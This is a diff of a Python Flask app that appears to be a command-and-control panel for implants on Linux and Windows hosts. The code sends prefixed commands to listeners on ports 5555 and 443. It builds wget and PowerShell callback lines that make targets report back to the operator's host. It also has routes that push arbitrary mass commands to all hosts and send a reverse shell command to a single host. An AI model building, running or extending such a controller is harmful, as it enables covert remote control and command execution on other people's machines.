@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
-import sys
+import base64
+import ipaddress
+import logging
 import socket
 import threading
 import time
-import logging
-import concurrent.futures
-from datetime import datetime
 from flask import Flask, request, render_template, redirect, url_for
-import ipaddress
 from flask_socketio import SocketIO, emit
 
 logging.basicConfig(level=logging.INFO)
@@ -23,80 +21,34 @@ class Scanner:
         self.ip_to_os = {}
         self.called_back_linux = set()
         self.called_back_windows = set()
+        self.failed_ips = set()
         self.scanner_ip = None
-        self.last_scan_at = None
-        self.last_scan_message = None
         self.connected_socket = None
         self.lock = threading.Lock()
+        self.callback_event = threading.Event()
 
     def get_devices(self):
         devices = []
         with self.lock:
             for ip in self.called_back_linux:
-                devices.append({'ip': ip, 'os': 'Linux', 'status': 'Called back'})
+                devices.append({'ip': ip, 'os': 'linux', 'status': 'Called back'})
             for ip in self.called_back_windows:
-                devices.append({'ip': ip, 'os': 'Windows', 'status': 'Called back'})
+                devices.append({'ip': ip, 'os': 'windows', 'status': 'Called back'})
             all_ips = self.linux_ips + self.windows_ips
             for ip in all_ips:
                 if ip not in self.called_back_linux and ip not in self.called_back_windows:
                     os_type = self.ip_to_os.get(ip, 'unknown')
-                    devices.append({'ip': ip, 'os': os_type.title() if isinstance(os_type, str) else 'Unknown', 'status': 'No response'})
+                    status = 'Failed to reach' if ip in self.failed_ips else 'No response'
+                    devices.append({'ip': ip, 'os': os_type, 'status': status})
         return devices
 
-
-def get_private_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        private_ip = s.getsockname()[0]
-        s.close()
-    except Exception:
-        private_ip = "127.0.0.1"
-    return private_ip
-
-
-def build_presets():
-    return [
-        {
-            'name': 'Lab sweep',
-            'linux_range': '10.1-13.1.10,20,30,40',
-            'windows_range': '10.1-13.1.60,70,80',
-            'note': 'Matches the defaults and is safe for demos.',
-        },
-        {
-            'name': 'Wide net',
-            'linux_range': '10.1-13.1.1-60',
-            'windows_range': '10.1-13.1.61-120',
-            'note': 'Bigger sweep for noisy lab ranges.',
-        },
-        {
-            'name': 'Fast check',
-            'linux_range': '10.1.1.10,20,30',
-            'windows_range': '10.1.1.60,70,80',
-            'note': 'Small batch for quick validation.',
-        },
-        {
-            'name': 'Custom baseline',
-            'linux_range': '192.168.1.10-14',
-            'windows_range': '192.168.1.60-64',
-            'note': 'Drop in your own lab segments.',
-        },
-    ]
-
-
-def summarize_devices(devices):
-    total = len(devices)
-    live = sum(1 for device in devices if device['status'] == 'Called back')
-    silent = total - live
-    linux = sum(1 for device in devices if device['os'].lower() == 'linux')
-    windows = sum(1 for device in devices if device['os'].lower() == 'windows')
-    return {
-        'total': total,
-        'live': live,
-        'silent': silent,
-        'linux': linux,
-        'windows': windows,
-    }
+    def all_devices_accounted_for(self):
+        """Check if all devices have either called back or failed to respond."""
+        with self.lock:
+            total_ips = len(self.linux_ips) + len(self.windows_ips)
+            responded = len(self.called_back_linux) + len(self.called_back_windows)
+            failed = len(self.failed_ips)
+            return responded + failed == total_ips
 
 app.scanner = Scanner()
 port = 8080
@@ -159,6 +111,7 @@ def callback():
         elif os_type == 'windows':
             app.scanner.called_back_windows.add(reported_ip)
     logger.info(f"Callback from {reported_ip} ({os_type})")
+    app.scanner.callback_event.set()
     return "OK"
 
 def parse_ip_range(ip_range_str):
@@ -210,6 +163,7 @@ def parse_ip_range(ip_range_str):
     return ips
 
 def send_linux_command(target_ip, cmd):
+    sock = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(1)
@@ -218,28 +172,34 @@ def send_linux_command(target_ip, cmd):
         data = b"INTLUPD:" + encrypted
         sock.sendto(data, (target_ip, 5555))
         logger.info(f"Sent Linux command to {target_ip}")
-        sock.close()
-        return True
     except Exception as e:
         logger.error(f"Error sending to Linux {target_ip}: {e}")
-        return False
+        with app.scanner.lock:
+            app.scanner.failed_ips.add(target_ip)
+        app.scanner.callback_event.set()
+    finally:
+        if sock:
+            sock.close()
 
 def send_windows_command(target_ip, cmd):
+    sock = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
         sock.connect((target_ip, 443))
         # Base64 encode cmd
-        import base64
         encoded = base64.b64encode(cmd.encode()).decode()
         data = b"INTLUPD:" + encoded.encode()
         sock.send(data)
         logger.info(f"Sent Windows command to {target_ip}")
-        sock.close()
-        return True
     except Exception as e:
         logger.error(f"Error sending to Windows {target_ip}: {e}")
-        return False
+        with app.scanner.lock:
+            app.scanner.failed_ips.add(target_ip)
+        app.scanner.callback_event.set()
+    finally:
+        if sock:
+            sock.close()
 
 def start_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -253,19 +213,39 @@ def start_listener():
             if app.scanner.connected_socket:
                 try:
                     app.scanner.connected_socket.close()
-                except:
-                    pass
+                except OSError as e:
+                    logger.warning(f"Error closing previous socket: {e}")
             app.scanner.connected_socket = client
 
 @app.route('/')
 def index():
-    return render_template(
-        'index.html',
-        private_ip=get_private_ip(),
-        linux_range="10.1-13.1.10,20,30,40",
-        windows_range="10.1-13.1.60,70,80",
-        presets=build_presets(),
-    )
+    # Get private IP
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        private_ip = s.getsockname()[0]
+        s.close()
+    except OSError as e:
+        logger.warning(f"Unable to determine private IP: {e}")
+        private_ip = "127.0.0.1"
+    linux_range = "10.1-13.1.10,20,30,40"
+    windows_range = "10.1-13.1.60,70,80"
+    return render_template('index.html', private_ip=private_ip, linux_range=linux_range, windows_range=windows_range)
+
+def wait_for_callbacks():
+    """Background task to wait for all callbacks/failures (up to 30 seconds)"""
+    max_wait_time = 30
+    start_time = time.time()
+    while time.time() - start_time < max_wait_time:
+        # Clear the event before waiting so we don't miss signals
+        app.scanner.callback_event.clear()
+        # Wait up to 1 second for a callback event
+        app.scanner.callback_event.wait(timeout=1)
+        # Check if all devices are accounted for
+        if app.scanner.all_devices_accounted_for():
+            logger.info("All devices accounted for, scan complete")
+            break
+    logger.info(f"Callback wait completed after {time.time() - start_time:.2f}s")
 
 @app.route('/scan', methods=['POST'])
 def scan():
@@ -282,73 +262,43 @@ def scan():
             app.scanner.ip_to_os[ip] = 'windows'
         app.scanner.called_back_linux = set()
         app.scanner.called_back_windows = set()
+        app.scanner.failed_ips = set()
         app.scanner.scanner_ip = scanner_ip
-        app.scanner.last_scan_at = datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')
-        app.scanner.last_scan_message = f'Scan dispatched to {len(app.scanner.linux_ips) + len(app.scanner.windows_ips)} targets'
+        app.scanner.callback_event.clear()
+    
     # send callback commands
     callback_url = f"http://{scanner_ip}:{port}/callback"
     linux_cmd = f"ip=$(ip route get 1 | awk '{{print $7}}'); wget -q -O /dev/null \"{callback_url}?ip=$ip\""
     windows_cmd = f"powershell -c \"Invoke-WebRequest -Uri ('{callback_url}?ip=' + (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{$_.InterfaceAlias -notlike '*Loopback*'}} | Select-Object -First 1).IPAddress) -UseBasicParsing\""
     
-    # Send commands in parallel using threading
-    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-        # Submit Linux commands
-        linux_futures = [executor.submit(send_linux_command, ip, linux_cmd) for ip in app.scanner.linux_ips]
-        # Submit Windows commands  
-        windows_futures = [executor.submit(send_windows_command, ip, windows_cmd) for ip in app.scanner.windows_ips]
-        all_futures = linux_futures + windows_futures
-        
-        # Wait for all commands to complete (optional, but good practice)
-        concurrent.futures.wait(all_futures)
-
-        # Count successes from send attempts (send functions return True/False)
-        successes = 0
-        try:
-            results = [f.result() for f in all_futures]
-            successes = sum(1 for r in results if r)
-        except Exception:
-            successes = 0
+    # Send Linux commands sequentially
+    for ip in app.scanner.linux_ips:
+        send_linux_command(ip, linux_cmd)
     
-    # Wait for callbacks but exit early if all successful sends have responded
-    max_wait = 30
-    interval = 0.5
-    waited = 0.0
-    no_response_threshold = 5  # If no responses in 5 seconds, assume nothing will respond
-    while waited < max_wait:
-        with app.scanner.lock:
-            called_total = len(app.scanner.called_back_linux) + len(app.scanner.called_back_windows)
-        # Only wait for responses from targets that successfully received send attempts
-        if called_total >= successes:
-            break
-        # If we've waited 5 seconds and got zero responses, exit (nothing is responding)
-        if waited >= no_response_threshold and called_total == 0:
-            break
-        time.sleep(interval)
-        waited += interval
-
+    # Send Windows commands in parallel using threads
+    windows_threads = []
+    for ip in app.scanner.windows_ips:
+        thread = threading.Thread(target=send_windows_command, args=(ip, windows_cmd))
+        thread.daemon = True
+        thread.start()
+        windows_threads.append(thread)
+    
+    # Wait for all Windows threads to complete before proceeding
+    for thread in windows_threads:
+        thread.join(timeout=5)
+    
+    # Start background task to wait for callbacks (doesn't block this request)
+    callback_thread = threading.Thread(target=wait_for_callbacks)
+    callback_thread.daemon = True
+    callback_thread.start()
+    
+    # Return immediately to allow the page to redirect while callbacks are being processed
     return redirect(url_for('results'))
 
 @app.route('/results')
 def results():
     devices = app.scanner.get_devices()
-    summary = summarize_devices(devices)
-    with app.scanner.lock:
-        scan_at = app.scanner.last_scan_at
-        scan_message = app.scanner.last_scan_message
-        scanner_ip = app.scanner.scanner_ip
-    return render_template(
-        'results.html',
-        devices=devices,
-        summary=summary,
-        scanner_ip=scanner_ip,
-        scan_at=scan_at,
-        scan_message=scan_message,
-    )
-
-
-@app.route('/guide')
-def guide():
-    return render_template('guide.html', presets=build_presets())
+    return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip)
 
 @app.route('/mass_command', methods=['POST'])
 def mass_command():
@@ -364,13 +314,12 @@ def mass_command():
         else:
             message = "Invalid OS"
             devices = app.scanner.get_devices()
-            return render_template('results.html', devices=devices, summary=summarize_devices(devices), scanner_ip=app.scanner.scanner_ip, message=message, scan_at=app.scanner.last_scan_at, scan_message=app.scanner.last_scan_message)
-    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
-        futures = [executor.submit(send_func, ip, cmd) for ip in targets]
-        concurrent.futures.wait(futures)
+            return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)
+    for ip in targets:
+        send_func(ip, cmd)
     message = f"Mass command sent to {len(targets)} {os_type} devices"
     devices = app.scanner.get_devices()
-    return render_template('results.html', devices=devices, summary=summarize_devices(devices), scanner_ip=app.scanner.scanner_ip, message=message, scan_at=app.scanner.last_scan_at, scan_message=app.scanner.last_scan_message)
+    return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)
 
 @app.route('/one_on_one', methods=['POST'])
 def one_on_one():
@@ -387,10 +336,10 @@ def one_on_one():
     else:
         message = "Unknown OS for IP"
         devices = app.scanner.get_devices()
-        return render_template('results.html', devices=devices, summary=summarize_devices(devices), scanner_ip=app.scanner.scanner_ip, message=message, scan_at=app.scanner.last_scan_at, scan_message=app.scanner.last_scan_message)
+        return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)
     message = f"Reverse shell command sent to {ip}. The connection should be established shortly. Use the shell interaction section below to send commands."
     devices = app.scanner.get_devices()
-    return render_template('results.html', devices=devices, summary=summarize_devices(devices), scanner_ip=app.scanner.scanner_ip, message=message, scan_at=app.scanner.last_scan_at, scan_message=app.scanner.last_scan_message)
+    return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)
 
 
 
